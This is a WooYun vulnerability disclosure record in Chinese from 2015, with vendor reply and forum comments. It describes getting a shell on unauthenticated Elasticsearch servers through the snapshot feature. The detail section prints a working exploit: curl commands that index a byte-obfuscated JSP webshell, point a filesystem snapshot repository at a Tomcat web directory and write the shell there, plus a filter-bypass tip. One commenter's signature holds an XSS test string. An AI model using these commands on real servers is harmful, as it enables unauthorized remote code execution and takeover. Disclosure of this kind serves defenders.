{"id": 12601, "wybug_id": "wooyun-2015-0110216", "wybug_title": "elasticsearch某内置功能缺陷利用可能导致getshell风险", "wybug_corp": "elasticsearch", "wybug_author": "园长", "wybug_date": "2015-04-25 01:22", "wybug_open_date": "2015-07-27 10:54", "wybug_type": "命令执行", "wybug_level": "中", "wybug_rank_0": "8", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-04-25：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-04-28：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-05-01：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-06-22：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-07-02：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-07-12：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-07-27：\t细节向公众公开  简要描述： 虽然只是个小问题，但是某些时候还是会存在getshell风险 详细说明：       elasticsearch服务普遍存在一个未授权访问的问题，攻击者通常可以请求一个开放9200或9300的服务器进行恶意攻击。基础信息:可以查看es节点信息，包括安装目录：http://localhost:9200/_nodes\n\n   未授权访问的elasticsearch(事实上绝大多数都没做访问授权)备份数据的时候存在一些小缺陷，可以用来进一步的获取权限。参考es官方的索引快找和恢复文档(Snapshot And Restore)：http://www.elastic.co/guide/en/elasticsearch/reference/current/modules-snapshots.html#_snapshot\n\n大概意思是说：     快照和恢复模块可以创建单独的索引或整个集群索引的快照到远程仓库。最初的es只提供了把数据备份到共享文件系统，但是现在的es可以通过官方的后端插件备份。首先创建一份恶意的索引文档(key为jsp一句话后门)：\ncurl -XPOST http://localhost:9200/yz.jsp/yz.jsp/1 -d'{\"<%new java.io.RandomAccessFile(application.getRealPath(new String(new byte[]{47,116,101,115,116,46,106,115,112})),new String(new byte[]{114,119})).write(request.getParameter(new String(new byte[]{102})).getBytes());%>\":\"test\"}'\n查看创建的文档： curl http://localhost:9200/yz.jsp/_search?pretty\n\n这里的我创把文档的index和type都设置成了yz.jsp,其中文档的key包含了一个jsp文件。然后创建一个恶意的存储库(Repositories)：\ncurl -XPUT 'http://localhost:9200/_snapshot/yz.jsp' -d '{     \"type\": \"fs\",     \"settings\": {          \"location\": \"/Users/yz/Documents/install/apache-tomcat-7.0.57/webapps/wwwroot/\",          \"compress\": false     }}'\n     这个Repositories的路径比较有意思，因为他可以写到可以访问到的任意地方，并且如果这个路径不存在的话会自动创建。那也就是说你可以通过文件访问协议创建任意的文件夹。这里我把这个路径指向到了tomcat的web部署目录，因为只要在这个文件夹创建目录Tomcat就会自动创建一个新的应用(文件名为wwwroot的话创建出来的应用名称就是wwwroot了)。既然知道可以创建任意目录，或许就可以想办法写个shell。存储库验证并创建:\ncurl -XPUT \"http://localhost:9200/_snapshot/yz.jsp/yz.jsp\" -d '{     \"indices\": \"yz.jsp\",     \"ignore_unavailable\": \"true\",     \"include_global_state\": false}'\n\n\n这个时候就可以看到tomcat目录的备份文件已经生成了多个jsp文件：\n\n一句话shell在/Users/yz/Documents/install/apache-tomcat-7.0.57/webapps/wwwroot/indices/yz.jsp/snapshot-yz.jsp:\n\n写大马:\n\n这里有2个点：     1、json不好绕过避开json应该是不可能了，所以避开双引号比较麻烦所以这里用了byte转String避免出现”\"。     2、如果不把compress设置成false会被es安全过滤(比如：toString、getXXX都会被过滤)，绕了半天才发现设置成不压缩就可以了......   漏洞证明：  \n\n\n\n   修复方案：  mapping校验，禁止创建特殊后缀   版权声明：转载请注明来源 园长@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：10  确认时间：2015-04-28 10:52 厂商回复： CNVD未复现所述漏洞情况，暂未建立与软件生产厂商（或网站管理单位）的直接处置渠道，待认领。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-04-25 01:24 |    \t\t小川  \t\t\t( 核心白帽子 |\t\t\t        Rank:1344 漏洞数:216        | 一个致力要将乌云变成搞笑论坛的男人)\t\t \n  前排瓜子，饮料，    \n     2015-04-25 01:30 |    \t\txsser  \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:18        | 当我又回首一切,这个世界会好吗?)\t\t \n  @小川 鄙视    \n     2015-04-25 01:42 |    \t\t天朝城管 \t\t\t( 普通白帽子  |\t\t\t        Rank:116 漏洞数:35        | 不要等到命玩你的时候才开始玩命)\t\t \n  啤酒 饮料 矿泉水    \n     2015-04-25 01:44 |    \t\t李旭敏 \t\t\t( 普通白帽子  |\t\t\t        Rank:469 漏洞数:71        | ฏ๎๎๎๎๎๎๎๎๎๎๎๎๎๎๎๎๎๎๎...)\t\t \n  表哥竟然冒泡了···    \n     2015-04-25 02:04 |    \t\tphith0n  \t\t\t( 核心白帽子 |\t\t\t        Rank:656 漏洞数:107        | 一个想当文人的黑客~)\t\t \n  大晚上的，不让人睡觉拉    \n     2015-04-25 02:14 |    \t\tFocusstart \t\t\t( 普通白帽子  |\t\t\t        Rank:574 漏洞数:163        | 努力让某某某成为最幸福的女人！)\t\t \n  @小川 死鬼，明天继续~    \n     2015-04-25 02:54 |    \t\tmango \t\t\t( 核心白帽子 |\t\t\t        Rank:1668 漏洞数:248        | 我有个2b女友！)\t\t \n  我靠~~~赞    \n     2015-04-25 03:56 |    \t\t流星warden \t\t\t( 实习白帽子  |\t\t\t        Rank:54 漏洞数:8        | The quieter you become,the more you are ...)\t\t \n   水果,泡面,老干妈    \n     2015-04-25 06:42 |    \t\tscanf \t\t\t( 核心白帽子 |\t\t\t        Rank:1232 漏洞数:186        | 。)\t\t \n  干货    \n     2015-04-25 08:30 |    \t\t子非海绵宝宝  \t\t\t( 核心白帽子 |\t\t\t        Rank:1044 漏洞数:106        | 发扬海绵宝宝的精神!你不是海绵宝宝,你怎...)\t\t \n  前面的腿收一下    \n     2015-04-25 08:38 |    \t\t’‘Nome \t\t\t( 实习白帽子  |\t\t\t        Rank:55 漏洞数:19        | 在此感谢 @M4sk @mango @裤裆 @泳少 @5up3r...)\t\t \n  园长  - - 爱你哟 么么哒 又可以看思路啦啦啦    \n     2015-04-25 08:43 |    \t\t浅蓝 \t\t\t( 普通白帽子  |\t\t\t        Rank:274 漏洞数:109        | 爱安全:www.ixsec.orgXsec社区:zone.ixse...)\t\t \n  水果,泡面,老干妈    \n     2015-04-25 08:49 |    \t\t末影人 \t\t\t( 实习白帽子  |\t\t\t        Rank:35 漏洞数:9        | 末影人(Enderman)是一个三个方格高的人形生...)\t\t \n  0day?    \n     2015-04-25 08:53 |    \t\tan0nym0u5 \t\t\t( 普通白帽子  |\t\t\t        Rank:172 漏洞数:31        )\t\t \n  这么多大晚上不睡觉的~    \n     2015-04-25 08:57 |    \t\tddy \t\t\t( 实习白帽子  |\t\t\t        Rank:44 漏洞数:16        | 其实第一次要我挖洞我是拒绝的。因为，你不...)\t\t \n  关注下    \n     2015-04-25 09:32 |    \t\t10457793 \t\t\t( 普通白帽子  |\t\t\t        Rank:867 漏洞数:128        | 说好的借，为什么从来不还？O(∩_∩)O)\t\t \n  园长出品必属精品    \n     2015-04-25 10:16 |    \t\t胡小树 \t\t\t( 实习白帽子  |\t\t\t        Rank:60 漏洞数:11        | 我是一颗小小树)\t\t \n  我去，大黑阔都不睡觉的    \n     2015-04-25 10:46 |    \t\t泳少 \t\t\t( 普通白帽子  |\t\t\t        Rank:231 漏洞数:79        | ★           梦想这条路踏上了，跪着也要...)\t\t \n  大晚上的，你居然不睡觉    \n     2015-04-25 11:02 |    \t\tboooooom  \t\t\t( 普通白帽子  |\t\t\t        Rank:467 漏洞数:50        | 我有一个好想法！)\t\t \n  表哥犀利    \n     2015-04-25 12:39 |    \t\tbitcoin \t\t\t( 普通白帽子  |\t\t\t        Rank:715 漏洞数:218        | 学习是最好的投资！)\t\t \n  大牛发招了！    \n     2015-04-25 13:41 |    \t\t动后河 \t\t\t( 实习白帽子  |\t\t\t        Rank:51 漏洞数:13        | ☭)\t\t \n  园长大大看这边~    \n     2015-04-25 13:52 |    \t\t浮萍 \t\t\t( 普通白帽子  |\t\t\t        Rank:555 漏洞数:118        | 默默潜水)\t\t \n  请收下我的膝盖    \n     2015-04-25 15:46 |    \t\t瘦蛟舞  \t\t\t( 普通白帽子  |\t\t\t        Rank:687 漏洞数:78        | 铁甲依然在)\t\t \n  表哥带我飞    \n     2015-04-25 16:09 |    \t\tsky \t\t\t( 实习白帽子  |\t\t\t        Rank:94 漏洞数:33        | 有一天，我带着儿子@jeary 去@园长 的园长...)\t\t \n  飞飞飞    \n     2015-04-25 16:18 |    \t\t秋风 \t\t\t( 普通白帽子  |\t\t\t        Rank:438 漏洞数:44        | 码农一枚，关注互联网安全)\t\t \n  NB!    \n     2015-04-25 17:28 |    \t\tSura、Rain \t\t\t( 路人 |\t\t\t        Rank:15 漏洞数:8        | 关注Java WEB安全)\t\t \n  坐等php狗写的站中枪    \n     2015-04-25 19:25 |    \t\tMody \t\t\t( 普通白帽子  |\t\t\t        Rank:110 漏洞数:27        | \"><img src=x onerror=alert(1);> <img s...)\t\t \n  园长mm，你屌爆了    \n     2015-04-28 09:38 |    \t\t_Evil \t\t\t( 普通白帽子  |\t\t\t        Rank:418 漏洞数:59        | 万事无他,唯手熟尔。农民也会编程,别指望天...)\t\t \n  = =小强子    \n     2015-04-28 15:42 |    \t\t盛大网络(乌云厂商)\t\t \n  Elasticsearch directory traversal vulnerability CVE-2015-3337  http://seclists.org/bugtraq/2015/Apr/188    \n     2015-04-28 15:53 |    \t\t园长 \t\t\t( 普通白帽子  |\t\t\t        Rank:134 漏洞数:14        | 你在身边就是缘，缘分写在数据库里面。)\t\t \n  @盛大网络 如此，甚好.    \n     2015-04-28 18:02 |    \t\t园长 \t\t\t( 普通白帽子  |\t\t\t        Rank:134 漏洞数:14        | 你在身边就是缘，缘分写在数据库里面。)\t\t \n  @盛大网络 不能遍历目录文件列表... http://zone.wooyun.org/content/20064    \n     2015-05-01 12:39 |    \t\t随随意意 \t\t\t( 普通白帽子  |\t\t\t        Rank:160 漏洞数:35        | 我对XSS并非真爱(┬＿┬)最近有人冒充该...)\t\t \n  我是来看园长姐姐的    \n     2015-05-01 15:22 |    \t\t小红猪 \t\t\t( 普通白帽子  |\t\t\t        Rank:194 漏洞数:30        | Wow~~~哈哈~~~)\t\t \n  卧槽，牛逼啊    \n     2015-07-27 12:44 |    \t\t泰迪 \t\t\t( 路人 |\t\t\t        Rank:10 漏洞数:1        | 我想知道这个以后还能改么)\t\t \n  园长！！！！    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 10, "Ranks": null}